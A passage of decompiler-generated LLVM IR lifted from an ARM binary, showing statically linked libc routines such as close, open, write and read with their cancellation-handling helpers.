  ret i32 %v0_12d60

; uselistorder directives
  uselistorder i32 %v0_12cc8, { 1, 0 }
  uselistorder i32 %v1_12cac.pre, { 0, 2, 1 }
  uselistorder i32* %stack_var_-40, { 2, 0, 3, 1 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 3, 4, 7, 8, 5, 6 }
  uselistorder i32 (i32, i32, i32)* @__libc_sigaction, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12d60, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_12ce8, { 1, 0 }
  uselistorder label %dec_label_pc_12ccc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12cb4, { 1, 0 }
}

define i32 @function_12d74(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12d74:
  %v0_12d74 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12d74, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_12d74
  %v2_12d74 = load i32, i32* @r4, align 4
  %v4_12d74 = lshr i32 %v2_12d74, %arg1
  %v5_12d74 = sub i32 32, %arg1
  %v6_12d74 = shl i32 %v2_12d74, %v5_12d74
  %v7_12d74 = or i32 %v6_12d74, %v4_12d74
  %v9_12d74 = and i32 %v7_12d74, %arg1
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_12d74, %bb
  %v7_12d80 = phi i32 [ %arg1, %dec_label_pc_12d74 ], [ %v9_12d74, %bb ]
  ret i32 %v7_12d80

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI___close_nocancel() local_unnamed_addr {
entry:
  %v0_12d94 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_12d94, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_12d94 = load i32, i32* @r0, align 4
  ret i32 %v2_12d94

bb1:                                              ; preds = %entry
  %v0_12d98 = call i32 @__syscall_error()
  ret i32 %v0_12d98
}

define i32 @__GI___libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12da4 = load i32, i32* @global_var_23f30.745, align 4
  %v2_12da8 = icmp eq i32 %v3_12da4, 0
  store i1 %v2_12da8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12da8, label %dec_label_pc_12db0, label %entry.dec_label_pc_12dcc_crit_edge

entry.dec_label_pc_12dcc_crit_edge:               ; preds = %entry
  %v3_12dcc.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_12dcc

dec_label_pc_12db0:                               ; preds = %entry
  %v0_12db0 = load i32, i32* @r7, align 4
  store i32 %v0_12db0, i32* @ip, align 4
  %v0_12dc0 = load i32, i32* @r0, align 4
  %v2_12dc0 = icmp ugt i32 %v0_12dc0, -4097
  %v7_12dc0 = icmp eq i32 %v0_12dc0, -4096
  store i1 %v7_12dc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12dc0, label %bb7, label %bb

bb:                                               ; preds = %dec_label_pc_12dcc, %bb8, %bb9, %dec_label_pc_12db0
  %merge2 = phi i32 [ %v0_12dc0, %dec_label_pc_12db0 ], [ %v0_12df0, %dec_label_pc_12dcc ], [ %v0_12e00, %bb8 ], [ %v0_12e00, %bb9 ]
  ret i32 %merge2

bb7:                                              ; preds = %dec_label_pc_12db0
  %v0_12dc8 = call i32 @__syscall_error()
  br label %dec_label_pc_12dcc

dec_label_pc_12dcc:                               ; preds = %entry.dec_label_pc_12dcc_crit_edge, %bb7
  %v3_12dcc = phi i32 [ %v3_12dcc.pre, %entry.dec_label_pc_12dcc_crit_edge ], [ %v0_12dc8, %bb7 ]
  %v9_12dcc = load i32, i32* @r7, align 4
  store i32 %v9_12dcc, i32* %stack_var_-8, align 4
  %v12_12dcc = load i32, i32* @lr, align 4
  %v0_12dd0 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_12dd0, i32* @ip, align 4
  store i32 %v3_12dcc, i32* @r7, align 4
  %v1_12dec = call i32 @__libc_disable_asynccancel(i32 %v0_12dd0)
  %v0_12df0 = load i32, i32* @r7, align 4
  store i32 %v0_12df0, i32* @r0, align 4
  %v2_12df4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12df4, i32* @r7, align 4
  store i32 %v12_12dcc, i32* @lr, align 4
  %v2_12df8 = icmp ugt i32 %v0_12df0, -4097
  %v7_12df8 = icmp eq i32 %v0_12df0, -4096
  store i1 %v7_12df8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12df8, label %bb8, label %bb

bb8:                                              ; preds = %dec_label_pc_12dcc
  %v0_12e00 = call i32 @__syscall_error()
  %v0_12e10 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_12e10, label %bb9, label %bb

bb9:                                              ; preds = %bb8
  %v1_12e10 = load i32, i32* @r1, align 4
  %v4_12e10 = inttoptr i32 %v1_12e10 to i32*
  store i32 %v1_12e10, i32* %v4_12e10, align 4
  %v5_12e10 = load i32, i32* @r4, align 4
  %v6_12e10 = load i32, i32* @r1, align 4
  %v7_12e10 = sub i32 %v6_12e10, %v5_12e10
  store i32 %v7_12e10, i32* @r1, align 4
  br label %bb

; uselistorder directives
  uselistorder i32 %v1_12e10, { 1, 0 }
  uselistorder i32 %v0_12e00, { 1, 0 }
  uselistorder i32 %v0_12df0, { 0, 2, 3, 1 }
  uselistorder i32 %v0_12dc0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12dcc, { 1, 0 }
  uselistorder label %bb, { 2, 1, 0, 3 }
}

define i32 @__GI___open_nocancel() local_unnamed_addr {
entry:
  %v0_12e24 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_12e24, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_12e24 = load i32, i32* @r0, align 4
  ret i32 %v2_12e24

bb1:                                              ; preds = %entry
  %v0_12e28 = call i32 @__syscall_error()
  ret i32 %v0_12e28
}

define i32 @__libc_open(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_12e34 = load i32, i32* @global_var_23f30.745, align 4
  %v2_12e38 = icmp eq i32 %v3_12e34, 0
  store i1 %v2_12e38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12e38, label %dec_label_pc_12e40, label %entry.dec_label_pc_12e5c_crit_edge

entry.dec_label_pc_12e5c_crit_edge:               ; preds = %entry
  %v3_12e5c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_12e5c

dec_label_pc_12e40:                               ; preds = %entry
  %v0_12e50 = load i32, i32* @r0, align 4
  %v2_12e50 = icmp ugt i32 %v0_12e50, -4097
  %v7_12e50 = icmp eq i32 %v0_12e50, -4096
  store i1 %v7_12e50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12e50, label %bb9, label %bb

bb:                                               ; preds = %dec_label_pc_12e5c, %bb10, %bb11, %dec_label_pc_12e40
  %merge2 = phi i32 [ %v0_12e50, %dec_label_pc_12e40 ], [ %v0_12e80, %dec_label_pc_12e5c ], [ %v0_12e90, %bb10 ], [ %v0_12e90, %bb11 ]
  ret i32 %merge2

bb9:                                              ; preds = %dec_label_pc_12e40
  %v0_12e58 = call i32 @__syscall_error()
  br label %dec_label_pc_12e5c

dec_label_pc_12e5c:                               ; preds = %entry.dec_label_pc_12e5c_crit_edge, %bb9
  %v3_12e5c = phi i32 [ %v3_12e5c.pre, %entry.dec_label_pc_12e5c_crit_edge ], [ %v0_12e58, %bb9 ]
  store i32 %v3_12e5c, i32* %stack_var_-24, align 4
  %v9_12e5c = load i32, i32* @r2, align 4
  %v12_12e5c = load i32, i32* @r3, align 4
  %v15_12e5c = load i32, i32* @r7, align 4
  store i32 %v15_12e5c, i32* %stack_var_-8, align 4
  %v18_12e5c = load i32, i32* @lr, align 4
  %v0_12e60 = call i32 @__libc_enable_asynccancel()
  %v2_12e68 = load i32, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %v9_12e5c, i32* @r2, align 4
  store i32 %v12_12e5c, i32* @r3, align 4
  store i32 %v2_12e68, i32* @r7, align 4
  %v1_12e7c = call i32 @__libc_disable_asynccancel(i32 %v0_12e60)
  %v0_12e80 = load i32, i32* @r7, align 4
  store i32 %v0_12e80, i32* @r0, align 4
  %v2_12e84 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12e84, i32* @r7, align 4
  store i32 %v18_12e5c, i32* @lr, align 4
  %v2_12e88 = icmp ugt i32 %v0_12e80, -4097
  %v7_12e88 = icmp eq i32 %v0_12e80, -4096
  store i1 %v7_12e88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12e88, label %bb10, label %bb

bb10:                                             ; preds = %dec_label_pc_12e5c
  %v0_12e90 = call i32 @__syscall_error()
  %v0_12ea0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_12ea0, label %bb11, label %bb

bb11:                                             ; preds = %bb10
  %v1_12ea0 = load i32, i32* @r1, align 4
  %v2_12ea0 = load i32, i32* @r4, align 4
  %v4_12ea0 = and i32 %v2_12ea0, %v1_12ea0
  store i32 %v4_12ea0, i32* @r1, align 4
  br label %bb

; uselistorder directives
  uselistorder i32 %v0_12e90, { 1, 0 }
  uselistorder i32 %v0_12e80, { 0, 2, 3, 1 }
  uselistorder i32 %v0_12e50, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12e5c, { 1, 0 }
  uselistorder label %bb, { 2, 1, 0, 3 }
}

define i32 @__GI___write_nocancel() local_unnamed_addr {
entry:
  %v0_12eb4 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_12eb4, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_12eb4 = load i32, i32* @r0, align 4
  ret i32 %v2_12eb4

bb1:                                              ; preds = %entry
  %v0_12eb8 = call i32 @__syscall_error()
  ret i32 %v0_12eb8
}

define i32 @__GI___libc_write(i32 %arg1, i64* %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %tmp = ptrtoint i64* %arg2 to i32
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12ec4 = load i32, i32* @global_var_23f30.745, align 4
  %v2_12ec8 = icmp eq i32 %v3_12ec4, 0
  store i1 %v2_12ec8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12ec8, label %dec_label_pc_12ed0, label %entry.dec_label_pc_12eec_crit_edge

entry.dec_label_pc_12eec_crit_edge:               ; preds = %entry
  %v3_12eec.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_12eec

dec_label_pc_12ed0:                               ; preds = %entry
  %v0_12ee0 = load i32, i32* @r0, align 4
  %v2_12ee0 = icmp ugt i32 %v0_12ee0, -4097
  %v7_12ee0 = icmp eq i32 %v0_12ee0, -4096
  store i1 %v7_12ee0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12ee0, label %bb10, label %bb

bb:                                               ; preds = %bb12, %bb11, %dec_label_pc_12eec, %dec_label_pc_12ed0
  %merge = phi i32 [ %v0_12ee0, %dec_label_pc_12ed0 ], [ %v0_12f10, %dec_label_pc_12eec ], [ %v0_12f20, %bb11 ], [ %v7_12f30, %bb12 ]
  ret i32 %merge

bb10:                                             ; preds = %dec_label_pc_12ed0
  %v0_12ee8 = call i32 @__syscall_error()
  br label %dec_label_pc_12eec

dec_label_pc_12eec:                               ; preds = %entry.dec_label_pc_12eec_crit_edge, %bb10
  %v3_12eec = phi i32 [ %v3_12eec.pre, %entry.dec_label_pc_12eec_crit_edge ], [ %v0_12ee8, %bb10 ]
  %v15_12eec = load i32, i32* @r3, align 4
  %v18_12eec = load i32, i32* @r7, align 4
  store i32 %v18_12eec, i32* %stack_var_-8, align 4
  %v21_12eec = load i32, i32* @lr, align 4
  %v0_12ef0 = call i32 @__libc_enable_asynccancel()
  store i32 %tmp, i32* @r1, align 4
  store i32 %v15_12eec, i32* @r3, align 4
  store i32 %v3_12eec, i32* @r7, align 4
  %v1_12f0c = call i32 @__libc_disable_asynccancel(i32 %v0_12ef0)
  %v0_12f10 = load i32, i32* @r7, align 4
  store i32 %v0_12f10, i32* @r0, align 4
  %v2_12f14 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12f14, i32* @r7, align 4
  store i32 %v21_12eec, i32* @lr, align 4
  %v2_12f18 = icmp ugt i32 %v0_12f10, -4097
  %v7_12f18 = icmp eq i32 %v0_12f10, -4096
  store i1 %v7_12f18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12f18, label %bb11, label %bb

bb11:                                             ; preds = %dec_label_pc_12eec
  %v0_12f20 = call i32 @__syscall_error()
  %v0_12f30 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_12f30, label %bb12, label %bb

bb12:                                             ; preds = %bb11
  %v1_12f30 = load i32, i32* @r1, align 4
  %v2_12f30 = inttoptr i32 %v1_12f30 to i64*
  %v3_12f30 = load i64, i64* %v2_12f30, align 4
  %v6_12f30 = udiv i64 %v3_12f30, 4294967296
  %v7_12f30 = trunc i64 %v6_12f30 to i32
  br label %bb

; uselistorder directives
  uselistorder i32 %v0_12f10, { 0, 2, 3, 1 }
  uselistorder i32 %v0_12ee0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12eec, { 1, 0 }
}

define i32 @__read_nocancel() local_unnamed_addr {
entry:
  %v0_12f44 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_12f44, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_12f44 = load i32, i32* @r0, align 4
  ret i32 %v2_12f44

bb1:                                              ; preds = %entry
  %v0_12f48 = call i32 @__syscall_error()
  ret i32 %v0_12f48

; uselistorder directives
  uselistorder i1* @cpsr_c, { 1, 2, 3, 4, 0 }
}

define i32 @__libc_read(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12f54 = load i32, i32* @global_var_23f30.745, align 4
  %v2_12f58 = icmp eq i32 %v3_12f54, 0
  br i1 %v2_12f58, label %dec_label_pc_12f60, label %entry.dec_label_pc_12f7c_crit_edge

entry.dec_label_pc_12f7c_crit_edge:               ; preds = %entry
  %v3_12f7c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_12f7c

dec_label_pc_12f60:                               ; preds = %entry
  %v0_12f70 = load i32, i32* @r0, align 4
  %v2_12f70 = icmp ugt i32 %v0_12f70, -4097
  br i1 %v2_12f70, label %bb8, label %bb

bb:                                               ; preds = %dec_label_pc_12f7c, %dec_label_pc_12f60
  %merge = phi i32 [ %v0_12f70, %dec_label_pc_12f60 ], [ %v0_12fa0, %dec_label_pc_12f7c ]
  ret i32 %merge

bb8:                                              ; preds = %dec_label_pc_12f60
  %v0_12f78 = call i32 @__syscall_error()
  br label %dec_label_pc_12f7c

dec_label_pc_12f7c:                               ; preds = %entry.dec_label_pc_12f7c_crit_edge, %bb8
  %v3_12f7c = phi i32 [ %v3_12f7c.pre, %entry.dec_label_pc_12f7c_crit_edge ], [ %v0_12f78, %bb8 ]
  %v6_12f7c = load i32, i32* @r1, align 4
  %v15_12f7c = load i32, i32* @r7, align 4
  store i32 %v15_12f7c, i32* %stack_var_-8, align 4
  %v18_12f7c = load i32, i32* @lr, align 4
  %v0_12f80 = call i32 @__libc_enable_asynccancel()
  store i32 %v6_12f7c, i32* @r1, align 4
  store i32 %v3_12f7c, i32* @r7, align 4
  %v1_12f9c = call i32 @__libc_disable_asynccancel(i32 %v0_12f80)
  %v0_12fa0 = load i32, i32* @r7, align 4
  store i32 %v0_12fa0, i32* @r0, align 4
  %v2_12fa4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12fa4, i32* @r7, align 4
  store i32 %v18_12f7c, i32* @lr, align 4
  %v2_12fa8 = icmp ugt i32 %v0_12fa0, -4097
  br i1 %v2_12fa8, label %bb9, label %bb

bb9:                                              ; preds = %dec_label_pc_12f7c
  %v0_12fb0 = call i32 @__syscall_error()
  ret i32 %v0_12fb0

; uselistorder directives
  uselistorder i32 %v0_12fa0, { 1, 2, 0 }
  uselistorder i32 ()* @__syscall_error, { 5, 4, 11, 7, 6, 10, 1, 0, 9, 3, 2, 8 }
  uselistorder label %dec_label_pc_12f7c, { 1, 0 }
}

define i32 @__libc_disable_asynccancel(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_12fc0 = load i32, i32* %r0.global-to-local, align 4
  %v1_12fc0 = and i32 %v0_12fc0, 2
  %v2_12fc0 = icmp eq i32 %v1_12fc0, 0
  %v3_12fc4 = load i32, i32* @r4, align 4
  store i32 %v3_12fc4, i32* %stack_var_-16, align 4
  br i1 %v2_12fc0, label %dec_label_pc_12fcc, label %dec_label_pc_13040

dec_label_pc_12fcc:                               ; preds = %entry
  %v0_12fcc = call i32 @__aeabi_read_tp()
  store i32 %v0_12fcc, i32* %r0.global-to-local, align 4
  %v1_12fd0 = add i32 %v0_12fcc, -1036
  %v2_12fd0 = inttoptr i32 %v1_12fd0 to i32*
  %v3_12fd0 = load i32, i32* %v2_12fd0, align 4
  %v1_12fd4 = add i32 %v0_12fcc, -1168
  store i32 %v1_12fd4, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_12fd8

dec_label_pc_12fd8:                               ; preds = %dec_label_pc_1300c.dec_label_pc_12fd8_crit_edge, %dec_label_pc_12fcc
  %v0_12fe4 = phi i32 [ %v0_12fe4.pre, %dec_label_pc_1300c.dec_label_pc_12fd8_crit_edge ], [ %v1_12fd4, %dec_label_pc_12fcc ]
  %v0_12fd8 = phi i32 [ %v0_1300c, %dec_label_pc_1300c.dec_label_pc_12fd8_crit_edge ], [ %v3_12fd0, %dec_label_pc_12fcc ]
  %v1_12fd8 = and i32 %v0_12fd8, -3
  store i32 %v1_12fd8, i32* %r7.global-to-local, align 4
  store i32 %v0_12fd8, i32* %r4.global-to-local, align 4
  store i32 %v1_12fd8, i32* @r1, align 4
  %v1_12fe4 = add i32 %v0_12fe4, 132
  store i32 %v1_12fe4, i32* @r2, align 4
  %v1_12fe823 = inttoptr i32 %v1_12fe4 to i32*
  %v2_12fe824 = load i32, i32* %v1_12fe823, align 4
  %v3_12fec26 = icmp uge i32 %v2_12fe824, %v0_12fd8
  store i1 %v3_12fec26, i1* %cpsr_c.global-to-local, align 1
  %v9_12fec32 = icmp eq i32 %v2_12fe824, %v0_12fd8
  br i1 %v9_12fec32, label %dec_label_pc_12ff4, label %dec_label_pc_1300c

dec_label_pc_12ff4:                               ; preds = %dec_label_pc_12fd8, %dec_label_pc_12ff4.dec_label_pc_12fe8_crit_edge
  %v0_12ff433 = phi i32 [ %v1_12fec.pre, %dec_label_pc_12ff4.dec_label_pc_12fe8_crit_edge ], [ %v0_12fd8, %dec_label_pc_12fd8 ]
  store i32 %v0_12ff433, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_13004 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_13004, label %dec_label_pc_13008, label %dec_label_pc_12ff4.dec_label_pc_12fe8_crit_edge

dec_label_pc_12ff4.dec_label_pc_12fe8_crit_edge:  ; preds = %dec_label_pc_12ff4
  %v0_12fe8.pre = load i32, i32* @r2, align 4
  %v1_12fec.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_12fe8 = inttoptr i32 %v0_12fe8.pre to i32*
  %v2_12fe8 = load i32, i32* %v1_12fe8, align 4
  %v3_12fec = icmp uge i32 %v2_12fe8, %v1_12fec.pre
  store i1 %v3_12fec, i1* %cpsr_c.global-to-local, align 1
  %v9_12fec = icmp eq i32 %v2_12fe8, %v1_12fec.pre
  br i1 %v9_12fec, label %dec_label_pc_12ff4, label %dec_label_pc_1300c

dec_label_pc_13008:                               ; preds = %dec_label_pc_12ff4
  %v0_13008 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1300c

dec_label_pc_1300c:                               ; preds = %dec_label_pc_12fd8, %dec_label_pc_12ff4.dec_label_pc_12fe8_crit_edge, %dec_label_pc_13008
  %v0_1300c = phi i32 [ %v0_13008, %dec_label_pc_13008 ], [ %v2_12fe824, %dec_label_pc_12fd8 ], [ %v2_12fe8, %dec_label_pc_12ff4.dec_label_pc_12fe8_crit_edge ]
  %v1_1300c = phi i32 [ %v0_13008, %dec_label_pc_13008 ], [ %v0_12fd8, %dec_label_pc_12fd8 ], [ %v1_12fec.pre, %dec_label_pc_12ff4.dec_label_pc_12fe8_crit_edge ]
  %v3_1300c = icmp uge i32 %v0_1300c, %v1_1300c
  store i1 %v3_1300c, i1* %cpsr_c.global-to-local, align 1
  %v9_1300c = icmp eq i32 %v0_1300c, %v1_1300c
  br i1 %v9_1300c, label %dec_label_pc_13034.preheader, label %dec_label_pc_1300c.dec_label_pc_12fd8_crit_edge

dec_label_pc_1300c.dec_label_pc_12fd8_crit_edge:  ; preds = %dec_label_pc_1300c
  %v0_12fe4.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_12fd8

dec_label_pc_13034.preheader:                     ; preds = %dec_label_pc_1300c
  %v0_130341 = load i32, i32* %r7.global-to-local, align 4
  %v1_130342 = and i32 %v0_130341, 12
  store i32 %v1_130342, i32* @r3, align 4
  %v2_130383 = icmp ugt i32 %v1_130342, 3
  store i1 %v2_130383, i1* %cpsr_c.global-to-local, align 1
  %v7_130385 = icmp eq i32 %v1_130342, 4
  br i1 %v7_130385, label %dec_label_pc_13018.lr.ph, label %dec_label_pc_13034.preheader.dec_label_pc_13040.loopexit_crit_edge

dec_label_pc_13034.preheader.dec_label_pc_13040.loopexit_crit_edge: ; preds = %dec_label_pc_13034.preheader
  %v1_13044.pre.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13040.loopexit

dec_label_pc_13018.lr.ph:                         ; preds = %dec_label_pc_13034.preheader
  %v0_1301c.pre = load i32, i32* %r5.global-to-local, align 4
  %v1_1301c = add i32 %v0_1301c.pre, 132
  %v2_13030 = inttoptr i32 %v1_1301c to i32*
  br label %dec_label_pc_13018

dec_label_pc_13018:                               ; preds = %dec_label_pc_13018.lr.ph, %dec_label_pc_13018
  %v0_13018 = phi i32 [ %v0_130341, %dec_label_pc_13018.lr.ph ], [ %v3_13030, %dec_label_pc_13018 ]
  store i32 %v0_13018, i32* @r2, align 4
  store i32 %v1_1301c, i32* %r0.global-to-local, align 4
  store i32 128, i32* @r1, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  %v3_13030 = load i32, i32* %v2_13030, align 4
  store i32 %v3_13030, i32* %r7.global-to-local, align 4
  %v1_13034 = and i32 %v3_13030, 12
  store i32 %v1_13034, i32* @r3, align 4
  %v7_13038 = icmp eq i32 %v1_13034, 4
  br i1 %v7_13038, label %dec_label_pc_13018, label %dec_label_pc_13034.dec_label_pc_13040.loopexit_crit_edge

dec_label_pc_13034.dec_label_pc_13040.loopexit_crit_edge: ; preds = %dec_label_pc_13018
  %v2_13038 = icmp ugt i32 %v1_13034, 3
  store i1 %v2_13038, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_13040.loopexit

dec_label_pc_13040.loopexit:                      ; preds = %dec_label_pc_13034.preheader.dec_label_pc_13040.loopexit_crit_edge, %dec_label_pc_13034.dec_label_pc_13040.loopexit_crit_edge
  %v1_13044.pre = phi i32 [ %v1_13044.pre.pre, %dec_label_pc_13034.preheader.dec_label_pc_13040.loopexit_crit_edge ], [ %v1_1301c, %dec_label_pc_13034.dec_label_pc_13040.loopexit_crit_edge ]
  %v2_13040.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_13040

dec_label_pc_13040:                               ; preds = %dec_label_pc_13040.loopexit, %entry
  %v1_13044 = phi i32 [ %v1_13044.pre, %dec_label_pc_13040.loopexit ], [ %v0_12fc0, %entry ]
  %v2_13040 = phi i32 [ %v2_13040.pre, %dec_label_pc_13040.loopexit ], [ %v3_12fc4, %entry ]
  store i32 %v2_13040, i32* @r4, align 4
  ret i32 %v1_13044

; uselistorder directives
  uselistorder i32 %v3_13030, { 1, 2, 0 }
  uselistorder i32 %v1_1301c, { 0, 2, 1 }
  uselistorder i32 %v0_13008, { 1, 0 }
  uselistorder i32 %v1_12fec.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_12fd8, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 5, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 0, 3, 5, 4, 2 }
  uselistorder label %dec_label_pc_13040.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_13018, { 1, 0 }
  uselistorder label %dec_label_pc_1300c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12ff4, { 1, 0 }
}

define i32 @__libc_enable_asynccancel() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_13048 = load i32, i32* @r4, align 4
  store i32 %v3_13048, i32* %stack_var_-24, align 4
  store i32 56496, i32* %r8.global-to-local, align 4
  %v0_13050 = call i32 @__aeabi_read_tp()
  %v1_13054 = add i32 %v0_13050, -1036
  %v2_13054 = inttoptr i32 %v1_13054 to i32*
  %v3_13054 = load i32, i32* %v2_13054, align 4
  store i32 %v3_13054, i32* %r6.global-to-local, align 4
  %v1_13058 = add i32 %v0_13050, -1168
  store i32 %v1_13058, i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32* %r8.global-to-local, align 4
  %v1_1306046 = or i32 %v3_13054, 2
  store i32 %v1_1306046, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1306449 = icmp eq i32 %v1_1306046, %v3_13054
  br i1 %v9_1306449, label %dec_label_pc_13110, label %dec_label_pc_1306c

dec_label_pc_1306c:                               ; preds = %entry, %bb.dec_label_pc_1306c_crit_edge
  %v0_13070 = phi i32 [ %v0_13070.pre, %bb.dec_label_pc_1306c_crit_edge ], [ %v1_13058, %entry ]
  %v1_1306051 = phi i32 [ %v1_13060, %bb.dec_label_pc_1306c_crit_edge ], [ %v1_1306046, %entry ]
  %v0_1307450 = phi i32 [ %v1_130a0, %bb.dec_label_pc_1306c_crit_edge ], [ %v3_13054, %entry ]
  store i32 %v1_1306051, i32* @r1, align 4
  %v1_13070 = add i32 %v0_13070, 132
  store i32 %v1_13070, i32* %r2.global-to-local, align 4
  store i32 %v0_1307450, i32* %r4.global-to-local, align 4
  %v1_1307834 = inttoptr i32 %v1_13070 to i32*
  %v2_1307835 = load i32, i32* %v1_1307834, align 4
  store i32 %v2_1307835, i32* @r3, align 4
  %v3_1307c37 = icmp uge i32 %v2_1307835, %v0_1307450
  store i1 %v3_1307c37, i1* %cpsr_c.global-to-local, align 1
  %v9_1307c43 = icmp eq i32 %v2_1307835, %v0_1307450
  br i1 %v9_1307c43, label %dec_label_pc_13084, label %dec_label_pc_1309c

dec_label_pc_13084:                               ; preds = %dec_label_pc_1306c, %dec_label_pc_13084.dec_label_pc_13078_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_13094 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_13094, label %dec_label_pc_13098, label %dec_label_pc_13084.dec_label_pc_13078_crit_edge

dec_label_pc_13084.dec_label_pc_13078_crit_edge:  ; preds = %dec_label_pc_13084
  %v0_13078.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1307c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_13078 = inttoptr i32 %v0_13078.pre to i32*
  %v2_13078 = load i32, i32* %v1_13078, align 4
  store i32 %v2_13078, i32* @r3, align 4
  %v3_1307c = icmp uge i32 %v2_13078, %v1_1307c.pre
  store i1 %v3_1307c, i1* %cpsr_c.global-to-local, align 1
  %v9_1307c = icmp eq i32 %v2_13078, %v1_1307c.pre
  br i1 %v9_1307c, label %dec_label_pc_13084, label %dec_label_pc_1309c

dec_label_pc_13098:                               ; preds = %dec_label_pc_13084
  %v0_13098 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_13098, i32* @r3, align 4
  br label %dec_label_pc_1309c

dec_label_pc_1309c:                               ; preds = %dec_label_pc_1306c, %dec_label_pc_13084.dec_label_pc_13078_crit_edge, %dec_label_pc_13098
  %v1_130a0 = phi i32 [ %v0_13098, %dec_label_pc_13098 ], [ %v2_1307835, %dec_label_pc_1306c ], [ %v2_13078, %dec_label_pc_13084.dec_label_pc_13078_crit_edge ]
  %v1_1309c = load i32, i32* %r6.global-to-local, align 4
  %v3_1309c = icmp uge i32 %v1_130a0, %v1_1309c
  store i1 %v3_1309c, i1* %cpsr_c.global-to-local, align 1
